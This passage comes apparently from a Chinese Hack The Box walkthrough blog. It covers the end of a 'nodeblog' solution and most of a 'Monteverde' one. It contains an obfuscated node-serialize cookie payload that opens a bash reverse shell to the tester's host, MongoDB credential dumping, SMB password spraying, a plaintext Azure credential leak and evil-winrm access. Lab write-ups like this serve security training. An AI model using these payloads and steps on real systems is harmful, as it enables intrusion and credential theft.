</span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>auth=%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%30%4c%7a%6b%77%4d%44%45%67%4d%44%34%6d%4d%51%6f%3d%7c%62%61%73%65%36%34%20%2d%64%20%7c%62%61%73%68%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Set-GPC</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure><p>收到shell回连，但是还报一个权限错误，我可以读取到user.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.4] from (UNKNOWN) [10.10.11.139] 38554<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (900): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>bash: /home/admin/.bashrc: Permission denied<br>admin@nodeblog:/opt/blog$ <span class="hljs-built_in">cd</span> /home<br>admin@nodeblog:/home$ <span class="hljs-built_in">ls</span><br>admin<br>admin@nodeblog:/home$ <span class="hljs-built_in">cd</span> admin/<br>bash: <span class="hljs-built_in">cd</span>: admin/: Permission denied<br>admin@nodeblog:/home$ <span class="hljs-built_in">chmod</span> +x admin<br>admin@nodeblog:/home$ <span class="hljs-built_in">cd</span> admin/<br>admin@nodeblog:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>admin@nodeblog:~$ <span class="hljs-built_in">cat</span> user.txt <br>5f8..........................<br></code></pre></td></tr></table></figure><h4 id="获取root-shell："><a href="#获取root-shell：" class="headerlink" title="获取root shell："></a>获取root shell：</h4><p>尝试提权，要密码的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@nodeblog:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> admin: <br>Sorry, try again.<br></code></pre></td></tr></table></figure><p>搜了一圈没什么关于密码文件的，系统内核也没漏洞，在遍历进程的时候发现第三方组件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; ps auxww<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mongodb      721  0.3  1.8 981828 76232 ?        Ssl  17:35   0:36 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf<br></code></pre></td></tr></table></figure><p>直接dump：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@nodeblog:/opt/blog$ mongodump<br>2022-05-14T20:49:15.381+0000writing admin.system.version to <br>2022-05-14T20:49:15.381+0000<span class="hljs-keyword">done</span> dumping admin.system.version (1 document)<br>2022-05-14T20:49:15.381+0000writing blog.articles to <br>2022-05-14T20:49:15.382+0000writing blog.users to <br>2022-05-14T20:49:15.382+0000<span class="hljs-keyword">done</span> dumping blog.articles (3 documents)<br>2022-05-14T20:49:15.382+0000<span class="hljs-keyword">done</span> dumping blog.users (1 document)<br>admin@nodeblog:/opt/blog$ <span class="hljs-built_in">ls</span><br>dumpnode_modules   package.json  server.js<br>modelspackage-lock.json  routes views<br></code></pre></td></tr></table></figure><p>在users.bson有密码字段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@nodeblog:/opt/blog/dump/blog$ <span class="hljs-built_in">ls</span><br>articles.bson  articles.metadata.json  users.bson  users.metadata.json<br>admin@nodeblog:/opt/blog/dump/blog$ <span class="hljs-built_in">cat</span> users.bson <br>n_ida�8<br><span class="hljs-comment">#s�     createdAt粳&#125;usernameadminpassword�IppsecSaysPleaseSubscribe__vadmin@nodeblog:/opt/blog/dump/blog$</span><br></code></pre></td></tr></table></figure><p>可以尝试sudo：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@nodeblog:/opt/blog/dump/blog$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> admin: <br>Matching Defaults entries <span class="hljs-keyword">for</span> admin on nodeblog:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User admin may run the following commands on nodeblog:<br>    (ALL) ALL<br>    (ALL : ALL) ALL<br>admin@nodeblog:/opt/blog/dump/blog$ sudo <span class="hljs-built_in">cat</span> /root/root.txt<br>004.................................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Monteverde</title>
    <link href="/post/HackTheBox-Monteverde.html"/>
    <url>/post/HackTheBox-Monteverde.html</url>
    
    <content type="html"><![CDATA[<h3 id="HTB-Walkthrough-Monteverde"><a href="#HTB-Walkthrough-Monteverde" class="headerlink" title="HTB Walkthrough - Monteverde"></a>HTB Walkthrough - Monteverde</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Thu May 26 13:28:07 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.10.10.172</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.172<br>Host is up (0.60s latency).<br>Not shown: 65516 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-26 05:37:52Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49674/tcp open  msrpc         Microsoft Windows RPC<br>49676/tcp open  msrpc         Microsoft Windows RPC<br>49693/tcp open  msrpc         Microsoft Windows RPC<br>49744/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>|_clock-skew: -1s<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-05-26T05:38:55<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Thu May 26 13:39:38 2022 -- 1 IP address (1 host up) scanned in 691.10 seconds</span><br></code></pre></td></tr></table></figure><p>SMB是不允许匿名访问的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172          <br>[+] IP: 10.10.10.172:445Name: 10.10.10.172 <br></code></pre></td></tr></table></figure><p>那么只能从RPC下手：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N 10.10.10.172<br>rpcclient $&gt; <span class="hljs-built_in">exit</span><br>$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N 10.10.10.172 -c enumdomusers &gt; user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt     <br>user:[Guest] rid:[0x1f5]<br>user:[AAD_987d7f2f57d2] rid:[0x450]<br>user:[mhope] rid:[0x641]<br>user:[SABatchJobs] rid:[0xa2a]<br>user:[svc-ata] rid:[0xa2b]<br>user:[svc-bexec] rid:[0xa2c]<br>user:[svc-netapp] rid:[0xa2d]<br>user:[dgalanos] rid:[0xa35]<br>user:[roleary] rid:[0xa36]<br>user:[smorgan] rid:[0xa37]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> user.txt | awk -F <span class="hljs-string">&quot;[&quot;</span>  <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; newuser.txt<br>$ <span class="hljs-built_in">cat</span> newuser.txt| awk -F <span class="hljs-string">&quot;]&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; exitusers.txt<br>$ <span class="hljs-built_in">cat</span> exitusers.txt                                       <br>Guest<br>AAD_987d7f2f57d2<br>mhope<br>SABatchJobs<br>svc-ata<br>svc-bexec<br>svc-netapp<br>dgalanos<br>roleary<br>smorgan<br></code></pre></td></tr></table></figure><p>这样我就获取到了一个用户名字典。</p><h4 id="SMB："><a href="#SMB：" class="headerlink" title="SMB："></a>SMB：</h4><p>继续在rpc搜索了一番，并没有找到任何密码， 我尝试对用户进行喷涂，就以收集到的用户名字典既当用户名亦当字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.172 -u user.txt -p user.txt --continue-on-success                   <br>SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)<br>&lt;skip&gt;..............................................<br>SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs<br><br></code></pre></td></tr></table></figure><p>命中一个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs<br>[+] IP: 10.10.10.172:445Name: 10.10.10.172                                      <br>    Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>azure_uploads                                     READ ONLY<br>C$                                                NO ACCESSDefault share<br>E$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>SYSVOL                                            READ ONLYLogon server share <br><span class="hljs-built_in">users</span>$                                            READ ONLY<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R <span class="hljs-string">&#x27;azure_uploads&#x27;</span><br>[+] IP: 10.10.10.172:445Name: 10.10.10.172                                      <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>azure_uploads                                     READ ONLY<br>.\azure_uploads\*<br>dr--r--r--                0 Fri Jan  3 20:43:36 2020.<br>dr--r--r--                0 Fri Jan  3 20:43:36 2020..<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R <span class="hljs-string">&#x27;users$&#x27;</span>       <br>[+] IP: 10.10.10.172:445Name: 10.10.10.172                                      <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br><span class="hljs-built_in">users</span>$                                            READ ONLY<br>.\<span class="hljs-built_in">users</span>$\*<br>dr--r--r--                0 Fri Jan  3 21:12:48 2020.<br>dr--r--r--                0 Fri Jan  3 21:12:48 2020..<br>dr--r--r--                0 Fri Jan  3 21:15:23 2020dgalanos<br>dr--r--r--                0 Fri Jan  3 21:41:18 2020mhope<br>dr--r--r--                0 Fri Jan  3 21:14:56 2020roleary<br>dr--r--r--                0 Fri Jan  3 21:14:28 2020smorgan<br>.\<span class="hljs-built_in">users</span>$\mhope\*<br>dr--r--r--                0 Fri Jan  3 21:41:18 2020.<br>dr--r--r--                0 Fri Jan  3 21:41:18 2020..<br>fw--w--w--             1212 Fri Jan  3 22:59:24 2020azure.xml<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c <span class="hljs-string">&#x27;get mhope/azure.xml azure.xml&#x27;</span><br>getting file \mhope\azure.xml of size 1212 as azure.xml (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)<br>$ <span class="hljs-built_in">cat</span> azure.xml           <br>��&lt;Objs Version=<span class="hljs-string">&quot;1.1.0.1&quot;</span> xmlns=<span class="hljs-string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;<br>  &lt;Obj RefId=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>    &lt;TN RefId=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;<br>      &lt;T&gt;System.Object&lt;/T&gt;<br>    &lt;/TN&gt;<br>    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;<br>    &lt;Props&gt;<br>      &lt;DT N=<span class="hljs-string">&quot;StartDate&quot;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;<br>      &lt;DT N=<span class="hljs-string">&quot;EndDate&quot;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;<br>      &lt;G N=<span class="hljs-string">&quot;KeyId&quot;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;<br>      &lt;S N=<span class="hljs-string">&quot;Password&quot;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;<br>    &lt;/Props&gt;<br>  &lt;/Obj&gt;<br>&lt;/Objs&gt;   <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> 4n0therD4y@n0th3r$ &gt; passwd.txt<br>$ crackmapexec smb 10.10.10.172 -u mhope -p passwd.txt --continue-on-success|grep <span class="hljs-string">&#x27;[+]&#x27;</span><br>SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$                            <br>[+] IP: 10.10.10.172:445Name: 10.10.10.172                                      <br>    Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>azure_uploads                                     READ ONLY<br>C$                                                NO ACCESSDefault share<br>E$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>SYSVOL                                            READ ONLYLogon server share <br><span class="hljs-built_in">users</span>$                                            READ ONLY<br></code></pre></td></tr></table></figure><h4 id="WINRM"><a href="#WINRM" class="headerlink" title="WINRM:"></a>WINRM:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec winrm 10.10.10.172 -u mhope -p passwd.txt --continue-on-success|grep <span class="hljs-string">&#x27;[+]&#x27;</span><br>WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$ <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\mhope\Documents&gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; <span class="hljs-built_in">cd</span> ../desktop<br>*Evil-WinRM* PS C:\Users\mhope\desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\mhope\desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---         1/3/2020   5:48 AM             32 user.txt<br><br><br>*Evil-WinRM* PS C:\Users\mhope\desktop&gt; <span class="hljs-built_in">cat</span> user.txt<br>4961....................................<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\mhope\desktop&gt; ipconfig /all<br><br>Windows IP Configuration<br><br>   Host Name . . . . . . . . . . . . : MONTEVERDE<br>   Primary Dns Suffix  . . . . . . . : MEGABANK.LOCAL<br>   Node <span class="hljs-built_in">Type</span> . . . . . . . . . . . . : Hybrid<br>   IP Routing Enabled. . . . . . . . : No<br>   WINS Proxy Enabled. . . . . . . . : No<br>   DNS Suffix Search List. . . . . . : MEGABANK.LOCAL<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ bloodhound-python --zip -c All -u mhope -p 4n0therD4y@n0th3r$ -ns 10.10.10.172 -dc MONTEVERDE.MEGABANK.LOCAL -d MEGABANK.LOCAL<br>INFO: Found AD domain: megabank.local<br>INFO: Connecting to LDAP server: MONTEVERDE.MEGABANK.LOCAL<br>INFO: Found 1 domains<br>INFO: Found 1 domains <span class="hljs-keyword">in</span> the forest<br>INFO: Found 1 computers<br>INFO: Connecting to LDAP server: MONTEVERDE.MEGABANK.LOCAL<br>INFO: Found 13 <span class="hljs-built_in">users</span><br>INFO: Connecting to GC LDAP server: MONTEVERDE.MEGABANK.LOCAL<br>INFO: Found 65 <span class="hljs-built_in">groups</span><br>INFO: Found 0 trusts<br>INFO: Starting computer enumeration with 10 workers<br>INFO: Querying computer: MONTEVERDE.MEGABANK.LOCAL<br>INFO: Done <span class="hljs-keyword">in</span> 00M 52S<br>INFO: Compressing output into 20220526142408_bloodhound.zip<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\mhope\desktop&gt; net user mhope<br>User name                    mhope<br>Full Name                    Mike Hope<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            1/2/2020 4:40:05 PM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          1/3/2020 4:40:05 PM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     No</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory               \\monteverde\users$\mhope</span><br><span class="hljs-string">Last logon                   1/3/2020 6:29:59 AM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Remote Management Use</span><br><span class="hljs-string">Global Group memberships     *Azure Admins         *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\mhope\desktop&gt; </span><br></code></pre></td></tr></table></figure><h4 id="Azure："><a href="#Azure：" class="headerlink" title="Azure："></a>Azure：</h4><p>mhope是组Azure Admins成员。关于Azure，可学习：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.xpnsec.com<span class="hljs-regexp">/azuread-connect-for-redteam/</span><br></code></pre></td></tr></table></figure><p>摘自以上原文：</p><p>第一个，可以说是最有趣的是密码哈希同步 (PHS)，它将用户帐户和密码哈希从 Active Directory 上传到 Azure。第二种方法是直通身份验证 (PTA)，它允许 Azure 将身份验证请求转发到本地 AD，而不是依赖于上传哈希。最后，我们有了联合身份验证，这是我们多次看到的传统 ADFS 部署。PHS……闻起来像 DCSync要开始我们对 PHS 的分析，我们应该查看负责处理密码哈希同步的程序集之一，<code>Microsoft.Online.PasswordSynchronization.dll</code>. 此程序集可以在 Azure AD Sync 的默认安装路径中找到<code>C:\Program Files\Microsoft Azure AD Sync\Bin</code>。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="hljs-built_in">ls</span> *Microsoft.Online.PasswordSynchronization.dll*<br><br><br>    Directory: C:\Program Files\Microsoft Azure AD Sync\Bin<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span 